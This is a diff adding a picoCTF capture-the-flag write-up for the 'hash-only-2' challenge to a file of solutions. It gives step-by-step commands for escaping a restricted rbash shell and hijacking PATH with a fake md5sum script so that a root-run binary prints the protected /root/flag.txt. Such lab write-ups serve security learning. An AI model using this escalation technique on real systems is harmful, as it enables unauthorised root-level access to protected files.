@@ -382,3 +382,41 @@ You provide the computed address:
 0x58d9f1cb336a
 ```
 Then you get the flag.
+
+---
+
+## ID 489 — hash-only-2
+## Approach:
+    1. Connect to the instance using the provided SSH credentials:
+        ssh ctf-player@rescued-float.picoctf.net -p XXXXXX
+        password: XXXXXXX
+
+    2. Escape the restricted rbash environment by launching a new shell:
+        bash
+
+    3. Run the vulnerable binary to see its behavior:
+        flaghasher
+        → it computes the MD5 hash of /root/flag.txt as root, but never reveals the actual flag.
+
+    4. Create a fake md5sum executable in /tmp that will instead print the real flag:
+
+#!/bin/sh
+cat /root/flag.txt
+
+
+    Commands used:
+
+        echo '#!/bin/sh' > /tmp/md5sum
+        echo 'cat /root/flag.txt' >> /tmp/md5sum
+        chmod +x /tmp/md5sum
+
+    5. Add /tmp to the beginning of the PATH so our fake md5sum is used instead of the real one:
+        export PATH=/tmp:$PATH
+
+    6. Confirm the hijack:
+        which md5sum
+        → shows /tmp/md5sum
+
+    7. Run flaghasher again:
+        flaghasher
+        → since the binary runs as root, it now executes our fake md5sum and prints the real flag.
